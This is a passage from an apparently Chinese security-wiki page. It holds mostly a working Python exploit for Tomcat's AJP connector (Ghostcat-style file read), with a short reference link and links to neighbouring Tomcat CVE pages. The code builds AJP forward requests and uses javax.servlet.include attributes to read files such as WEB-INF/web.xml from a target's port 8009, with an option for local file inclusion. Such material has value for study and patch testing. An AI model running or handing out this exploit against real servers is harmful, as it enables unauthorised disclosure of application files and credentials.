        <span class="bp">self</span><span class="o">.</span><span class="n">data_length</span><span class="p">,</span> <span class="o">=</span> <span class="n">unpack</span><span class="p">(</span><span class="n">stream</span><span class="p">,</span> <span class="s2">&quot;&gt;H&quot;</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">data</span> <span class="o">=</span> <span class="n">stream</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">data_length</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">parse_end_response</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">stream</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">reuse</span><span class="p">,</span> <span class="o">=</span> <span class="n">unpack</span><span class="p">(</span><span class="n">stream</span><span class="p">,</span> <span class="s2">&quot;b&quot;</span><span class="p">)</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">parse_get_body_chunk</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">stream</span><span class="p">):</span>
        <span class="n">rlen</span><span class="p">,</span> <span class="o">=</span> <span class="n">unpack</span><span class="p">(</span><span class="n">stream</span><span class="p">,</span> <span class="s2">&quot;&gt;H&quot;</span><span class="p">)</span>
        <span class="k">return</span> <span class="n">rlen</span>

    <span class="nd">@staticmethod</span>
    <span class="k">def</span><span class="w"> </span><span class="nf">receive</span><span class="p">(</span><span class="n">stream</span><span class="p">):</span>
        <span class="n">r</span> <span class="o">=</span> <span class="n">AjpResponse</span><span class="p">()</span>
        <span class="n">r</span><span class="o">.</span><span class="n">parse</span><span class="p">(</span><span class="n">stream</span><span class="p">)</span>
        <span class="k">return</span> <span class="n">r</span>


<span class="k">def</span><span class="w"> </span><span class="nf">prepare_ajp_forward_request</span><span class="p">(</span><span class="n">target_host</span><span class="p">,</span> <span class="n">req_uri</span><span class="p">,</span> <span class="n">method</span><span class="o">=</span><span class="n">AjpForwardRequest</span><span class="o">.</span><span class="n">GET</span><span class="p">):</span>
    <span class="n">fr</span> <span class="o">=</span> <span class="n">AjpForwardRequest</span><span class="p">(</span><span class="n">AjpForwardRequest</span><span class="o">.</span><span class="n">SERVER_TO_CONTAINER</span><span class="p">)</span>
    <span class="n">fr</span><span class="o">.</span><span class="n">method</span> <span class="o">=</span> <span class="n">method</span>
    <span class="n">fr</span><span class="o">.</span><span class="n">protocol</span> <span class="o">=</span> <span class="s2">&quot;HTTP/1.1&quot;</span>
    <span class="n">fr</span><span class="o">.</span><span class="n">req_uri</span> <span class="o">=</span> <span class="n">req_uri</span>
    <span class="n">fr</span><span class="o">.</span><span class="n">remote_addr</span> <span class="o">=</span> <span class="n">target_host</span>
    <span class="n">fr</span><span class="o">.</span><span class="n">remote_host</span> <span class="o">=</span> <span class="kc">None</span>
    <span class="n">fr</span><span class="o">.</span><span class="n">server_name</span> <span class="o">=</span> <span class="n">target_host</span>
    <span class="n">fr</span><span class="o">.</span><span class="n">server_port</span> <span class="o">=</span> <span class="mi">80</span>
    <span class="n">fr</span><span class="o">.</span><span class="n">request_headers</span> <span class="o">=</span> <span class="p">{</span>
        <span class="s1">&#39;SC_REQ_ACCEPT&#39;</span><span class="p">:</span> <span class="s1">&#39;text/html&#39;</span><span class="p">,</span>
        <span class="s1">&#39;SC_REQ_CONNECTION&#39;</span><span class="p">:</span> <span class="s1">&#39;keep-alive&#39;</span><span class="p">,</span>
        <span class="s1">&#39;SC_REQ_CONTENT_LENGTH&#39;</span><span class="p">:</span> <span class="s1">&#39;0&#39;</span><span class="p">,</span>
        <span class="s1">&#39;SC_REQ_HOST&#39;</span><span class="p">:</span> <span class="n">target_host</span><span class="p">,</span>
        <span class="s1">&#39;SC_REQ_USER_AGENT&#39;</span><span class="p">:</span> <span class="s1">&#39;Mozilla&#39;</span><span class="p">,</span>
        <span class="s1">&#39;Accept-Encoding&#39;</span><span class="p">:</span> <span class="s1">&#39;gzip, deflate, sdch&#39;</span><span class="p">,</span>
        <span class="s1">&#39;Accept-Language&#39;</span><span class="p">:</span> <span class="s1">&#39;en-US,en;q=0.5&#39;</span><span class="p">,</span>
        <span class="s1">&#39;Upgrade-Insecure-Requests&#39;</span><span class="p">:</span> <span class="s1">&#39;1&#39;</span><span class="p">,</span>
        <span class="s1">&#39;Cache-Control&#39;</span><span class="p">:</span> <span class="s1">&#39;max-age=0&#39;</span>
    <span class="p">}</span>
    <span class="n">fr</span><span class="o">.</span><span class="n">is_ssl</span> <span class="o">=</span> <span class="kc">False</span>
    <span class="n">fr</span><span class="o">.</span><span class="n">attributes</span> <span class="o">=</span> <span class="p">[]</span>
    <span class="k">return</span> <span class="n">fr</span>


<span class="k">class</span><span class="w"> </span><span class="nc">Tomcat</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
    <span class="k">def</span><span class="w"> </span><span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">target_host</span><span class="p">,</span> <span class="n">target_port</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">target_host</span> <span class="o">=</span> <span class="n">target_host</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">target_port</span> <span class="o">=</span> <span class="n">target_port</span>

        <span class="bp">self</span><span class="o">.</span><span class="n">socket</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">socket</span><span class="o">.</span><span class="n">setsockopt</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">SOL_SOCKET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SO_REUSEADDR</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">socket</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">target_host</span><span class="p">,</span> <span class="n">target_port</span><span class="p">))</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">stream</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">socket</span><span class="o">.</span><span class="n">makefile</span><span class="p">(</span><span class="s2">&quot;rb&quot;</span><span class="p">,</span> <span class="n">bufsize</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">perform_request</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">req_uri</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="p">{},</span> <span class="n">method</span><span class="o">=</span><span class="s1">&#39;GET&#39;</span><span class="p">,</span> <span class="n">user</span><span class="o">=</span><span class="kc">None</span><span class="p">,</span> <span class="n">password</span><span class="o">=</span><span class="kc">None</span><span class="p">,</span> <span class="n">attributes</span><span class="o">=</span><span class="p">[],</span> <span class="n">lfi</span><span class="o">=</span><span class="kc">False</span><span class="p">):</span>
        <span class="k">if</span> <span class="n">lfi</span><span class="p">:</span>
            <span class="bp">self</span><span class="o">.</span><span class="n">req_uri</span> <span class="o">=</span> <span class="n">req_uri</span> <span class="o">+</span> <span class="s1">&#39;.jspx&#39;</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="bp">self</span><span class="o">.</span><span class="n">req_uri</span> <span class="o">=</span> <span class="n">req_uri</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">forward_request</span> <span class="o">=</span> <span class="n">prepare_ajp_forward_request</span><span class="p">(</span>
            <span class="bp">self</span><span class="o">.</span><span class="n">target_host</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">req_uri</span><span class="p">,</span> <span class="n">method</span><span class="o">=</span><span class="n">AjpForwardRequest</span><span class="o">.</span><span class="n">REQUEST_METHODS</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">method</span><span class="p">))</span>
        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Getting resource at ajp13://</span><span class="si">%s</span><span class="s2">:</span><span class="si">%d%s</span><span class="s2">&quot;</span> <span class="o">%</span>
              <span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">target_host</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">target_port</span><span class="p">,</span> <span class="n">req_uri</span><span class="p">))</span>
        <span class="k">if</span> <span class="n">user</span> <span class="ow">is</span> <span class="ow">not</span> <span class="kc">None</span> <span class="ow">and</span> <span class="n">password</span> <span class="ow">is</span> <span class="ow">not</span> <span class="kc">None</span><span class="p">:</span>
            <span class="bp">self</span><span class="o">.</span><span class="n">forward_request</span><span class="o">.</span><span class="n">request_headers</span><span class="p">[</span><span class="s1">&#39;SC_REQ_AUTHORIZATION&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&quot;Basic &quot;</span> <span class="o">+</span> <span class="p">(</span>
                <span class="s2">&quot;</span><span class="si">%s</span><span class="s2">:</span><span class="si">%s</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="n">user</span><span class="p">,</span> <span class="n">password</span><span class="p">))</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;base64&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span>
        <span class="k">for</span> <span class="n">h</span> <span class="ow">in</span> <span class="n">headers</span><span class="p">:</span>
            <span class="bp">self</span><span class="o">.</span><span class="n">forward_request</span><span class="o">.</span><span class="n">request_headers</span><span class="p">[</span><span class="n">h</span><span class="p">]</span> <span class="o">=</span> <span class="n">headers</span><span class="p">[</span><span class="n">h</span><span class="p">]</span>
        <span class="k">for</span> <span class="n">a</span> <span class="ow">in</span> <span class="n">attributes</span><span class="p">:</span>
            <span class="bp">self</span><span class="o">.</span><span class="n">forward_request</span><span class="o">.</span><span class="n">attributes</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
        <span class="n">responses</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">forward_request</span><span class="o">.</span><span class="n">send_and_receive</span><span class="p">(</span>
            <span class="bp">self</span><span class="o">.</span><span class="n">socket</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">stream</span><span class="p">)</span>
        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">responses</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
            <span class="k">return</span> <span class="kc">None</span><span class="p">,</span> <span class="kc">None</span>
        <span class="n">snd_hdrs_res</span> <span class="o">=</span> <span class="n">responses</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
        <span class="n">data_res</span> <span class="o">=</span> <span class="n">responses</span><span class="p">[</span><span class="mi">1</span><span class="p">:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">data_res</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
            <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;No data in response. Headers:</span><span class="si">%s</span><span class="se">\n</span><span class="s2">&quot;</span> <span class="o">%</span>
                  <span class="n">snd_hdrs_res</span><span class="o">.</span><span class="n">response_headers</span><span class="p">)</span>
        <span class="k">return</span> <span class="n">snd_hdrs_res</span><span class="p">,</span> <span class="n">data_res</span>


<span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="o">.</span><span class="n">ArgumentParser</span><span class="p">()</span>
<span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s2">&quot;target&quot;</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">str</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s2">&quot;Hostname or IP to attack&quot;</span><span class="p">)</span>
<span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">&#39;-p&#39;</span><span class="p">,</span> <span class="s1">&#39;--port&#39;</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">int</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="mi">8009</span><span class="p">,</span>
                    <span class="n">help</span><span class="o">=</span><span class="s2">&quot;AJP port to attack (default is 8009)&quot;</span><span class="p">)</span>
<span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">&#39;-w&#39;</span><span class="p">,</span> <span class="s1">&#39;--webapp&#39;</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">str</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="s1">&#39;ROOT&#39;</span><span class="p">,</span>
                    <span class="n">help</span><span class="o">=</span><span class="s2">&quot;Which webapp to attack (default is ROOT&quot;</span><span class="p">)</span>
<span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">&#39;-f&#39;</span><span class="p">,</span> <span class="s1">&#39;--file&#39;</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">str</span><span class="p">,</span>
                    <span class="n">default</span><span class="o">=</span><span class="s1">&#39;WEB-INF/web.xml&#39;</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s2">&quot;file path :(WEB-INF/web.xml)&quot;</span><span class="p">)</span>
<span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">&#39;-l&#39;</span><span class="p">,</span> <span class="s1">&#39;--lfi&#39;</span><span class="p">,</span> <span class="n">action</span><span class="o">=</span><span class="s2">&quot;store_true&quot;</span><span class="p">,</span>
                    <span class="n">help</span><span class="o">=</span><span class="s2">&quot;local file include&quot;</span><span class="p">)</span>
<span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="o">.</span><span class="n">parse_args</span><span class="p">()</span>
<span class="n">t</span> <span class="o">=</span> <span class="n">Tomcat</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">target</span><span class="p">,</span> <span class="n">args</span><span class="o">.</span><span class="n">port</span><span class="p">)</span>
<span class="n">_</span><span class="p">,</span> <span class="n">data</span> <span class="o">=</span> <span class="n">t</span><span class="o">.</span><span class="n">perform_request</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="o">+</span><span class="n">args</span><span class="o">.</span><span class="n">webapp</span><span class="o">+</span><span class="s1">&#39;/&#39;</span><span class="p">,</span> <span class="n">attributes</span><span class="o">=</span><span class="p">[</span>
    <span class="p">{</span><span class="s1">&#39;name&#39;</span><span class="p">:</span> <span class="s1">&#39;req_attribute&#39;</span><span class="p">,</span> <span class="s1">&#39;value&#39;</span><span class="p">:</span> <span class="p">[</span>
        <span class="s1">&#39;javax.servlet.include.request_uri&#39;</span><span class="p">,</span> <span class="s1">&#39;/&#39;</span><span class="p">]},</span>
    <span class="p">{</span><span class="s1">&#39;name&#39;</span><span class="p">:</span> <span class="s1">&#39;req_attribute&#39;</span><span class="p">,</span> <span class="s1">&#39;value&#39;</span><span class="p">:</span> <span class="p">[</span>
        <span class="s1">&#39;javax.servlet.include.path_info&#39;</span><span class="p">,</span> <span class="n">args</span><span class="o">.</span><span class="n">file</span><span class="p">]},</span>
    <span class="p">{</span><span class="s1">&#39;name&#39;</span><span class="p">:</span> <span class="s1">&#39;req_attribute&#39;</span><span class="p">,</span> <span class="s1">&#39;value&#39;</span><span class="p">:</span> <span class="p">[</span>
        <span class="s1">&#39;javax.servlet.include.servlet_path&#39;</span><span class="p">,</span> <span class="s1">&#39;/&#39;</span><span class="p">]},</span>
<span class="p">],</span> <span class="n">lfi</span><span class="o">=</span><span class="n">args</span><span class="o">.</span><span class="n">lfi</span><span class="p">)</span>
<span class="nb">print</span><span class="p">(</span><span class="s1">&#39;----------------------------&#39;</span><span class="p">)</span>
<span class="nb">print</span><span class="p">(</span><span class="s2">&quot;&quot;</span><span class="o">.</span><span class="n">join</span><span class="p">([</span><span class="n">d</span><span class="o">.</span><span class="n">data</span> <span class="k">for</span> <span class="n">d</span> <span class="ow">in</span> <span class="n">data</span><span class="p">]))</span>
</code></pre></div>

<h2 id="_6">参考链接<a class="headerlink" href="#_6" title="Permanent link">&para;</a></h2>
<blockquote>
<p><a href="https://forum.90sec.com/t/topic/801">https://forum.90sec.com/t/topic/801</a></p>
</blockquote>

  <br>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../%EF%BC%88CVE-2020-9484%EF%BC%89Tomcat%20session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../%EF%BC%88CVE-2020-9484%EF%BC%89Tomcat%20session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
        （CVE-2020-9484）Tomcat session反序列化漏洞
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../%EF%BC%88CVE-2019-0232%EF%BC%89Tomcat%20rce/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../%EF%BC%88CVE-2019-0232%EF%BC%89Tomcat%20rce/" class="btn btn-xs btn-link">
        （CVE-2019-0232）Tomcat rce
      </a>
    </div>
    
  </div>

    <br>
</div>

<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
</footer>

</body>
</html>